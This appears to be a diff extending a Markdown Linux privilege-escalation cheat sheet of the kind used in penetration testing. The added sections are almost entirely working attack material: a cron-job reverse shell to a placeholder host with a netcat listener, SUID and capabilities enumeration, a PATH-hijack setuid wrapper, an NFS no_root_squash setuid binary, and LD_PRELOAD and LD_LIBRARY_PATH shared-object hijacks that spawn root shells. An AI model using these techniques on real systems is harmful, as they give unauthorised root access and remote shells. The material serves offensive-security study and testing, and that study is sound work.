@@ -130,6 +130,8 @@ Folders and files that can be written to or executed from:
 
 `find / -perm -u=s -type f`: Find files with the SUID bit, which allows the file to run with the privilege level of the account that owns it, rather than the account which runs it.
 
+`find / -type f -perm -04000 -ls 2>/dev/null`: Another SUID
+
 <br>
 
 Find development tools and supported languages:
@@ -348,6 +350,165 @@ the -s option is specified.
 
 ```shell
 crontab -e
+```
+
+```shell
+cat /etc/crontab
+```
+
+- Edit the script that will be executed at a certain time:
+
+    ```shell
+    #!/bin/bash
+
+    bash -i >& /dev/tcp/a.b.c.d/6666 0>&1
+    ```
+
+- Run netcat:
+
+    ```shell
+    nc -vnlp 6666
+    ```
+
+## Capabilities
+
+```shell
+getcap -r /
+```
+
+## PATH
+
+```shell
+export PATH=/tmp:$PATH
+```
+
+```shell
+echo "/bin/bash" > /tmp/exploit
+```
+
+```shell
+chmod 777 /tmp/exploit
+```
+
+```c
+void main(){
+    setuid(0);
+    setgid(0);
+    system("exploit");
+}
+```
+
+```shell
+gcc exp.c -o exp
+```
+
+```shell
+chmod +s exp
+```
+
+```shell
+./exp
+```
+
+## NFS (Network File Sharing)
+
+1. The critical element for this privilege escalation vector is the `“no_root_squash”` option:
+
+    ```shell
+    cat /etc/exports
+    ```
+
+2. Enumerating mountable shares from our attacking machine:
+
+    ```shell
+    showmount -e a.b.c.d
+    ```
+
+3. We will mount one of the `“no_root_squash”` shares to our attacking machine and start building our executable:
+
+    ```shell
+    mkdir /tmp/folderonattackermachine
+    ```
+
+    ```shell
+    mount -o rw a.b.c.d:/folder /tmp/folderonattackermachine
+    ```
+
+    ```c
+    int main(){
+        setgid(0);
+        setuid(0);
+        system("/bin/bash");
+        return 0;
+    }
+    ```
+
+    ```shell
+    gcc nfs.c -o nfs -w
+    ```
+
+    ```shell
+    chmod +s nfs
+    ```
+
+## LD_PRELOAD
+
+> **LD_PRELOAD** and **LD_LIBRARY_PATH** are both inherited from the user's environment. **LD_PRELOAD** loads a shared object before any others when a program is run. **LD_LIBRARY_PATH** provides a list of directories where shared libraries are searched for first.
+>
+> > env_keep+=LD_PRELOAD
+
+```shell
+sudo -l
+```
+
+### preload.c
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+```
+
+```shell
+gcc -fPIC -shared -nostartfiles -o preload.so preload.c
+```
+
+```shell
+sudo LD_PRELOAD=/home/user/ldpreload/preload.so <program-name-here>
+```
+
+### library_path.c
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+    unsetenv("LD_LIBRARY_PATH");
+    setresuid(0,0,0);
+    system("/bin/bash -p");
+}
+```
+
+```shell
+ldd /usr/sbin/apache2
+```
+
+```shell
+gcc -fPIC -shared -o /tmp/libcrypt.so.1 library_path.c
+```
+
+```shell
+sudo LD_LIBRARY_PATH=/tmp apache2
 ```
 
 ## Other cheatsheets
